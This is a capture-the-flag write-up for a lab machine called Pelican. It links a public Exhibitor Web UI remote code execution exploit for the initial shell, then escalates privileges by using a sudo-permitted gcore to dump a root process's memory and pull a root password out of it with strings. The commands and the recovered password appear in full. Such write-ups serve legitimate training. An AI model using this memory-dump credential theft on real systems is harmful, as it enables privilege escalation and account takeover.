# Exploit the Service

I searched for an exploit for Exhibitor for Zookeeper and found an interesting note.

[Exhibitor Web UI 1.7.1 - Remote Code Execution](https://www.exploit-db.com/exploits/48654)

![Screenshot 2023-10-02 at 02.19.01.png](Pelican%20cc5be9ecb14f4241b87f5ab19c417ad7/Screenshot_2023-10-02_at_02.19.01.png)

I added the necessary part in the java.env script and committed the setting.

# Low Privilege Shell

I successfully got the shell.

# Privilege Escalation

```bash
charles@pelican:/opt/zookeeper$ sudo -l
sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
```

The command `/usr/bin/gcore` is allowed to run as root apparently.

[gcore - GTFOBins](https://gtfobins.github.io/gtfobins/gcore/)

The gcore command generates a core file (dump file) of a running process. It can be used to retrieve sensitive information if the process is run by root.  
It can be a way to retrieve sensitive information if the process is run by root.

```bash
root       527  0.0  0.0   2276    72 ?        Ss   18:02   0:00 /usr/bin/password-store
```
I found an interesting process:

```bash
sudo /usr/bin/gcore 527
```
I got the dump.

```bash
charles@pelican:~$ strings core.527
strings core.527
CORE
password-store
/usr/bin/password-store 
CORE
CORE
/usr/bin/passwor
////////////////
LINUX
...
```
I analyzed the strings.

```bash
001 Password: root:
ClogKingpinInning731
```
I found interesting text. It could be root password.

![Screenshot 2023-10-02 at 02.45.22.png](Pelican%20cc5be9ecb14f4241b87f5ab19c417ad7/Screenshot_2023-10-02_at_02.45.22.png)

`sudo su root -p`  and paste the password and got the root shell.

# Note
After taking a break from the Linux CTF challenges, diving into this one brought back the familiar excitement of the challenge. It took some effort to track down a shell. But it turned out that the vulnerability had been hiding in plain sight on the web page all along.  
In the enumeration stage, I missed some important information because the version of the vulnerability didn't seem to match. This remined me to stay vigilant and pay attention to every detail.
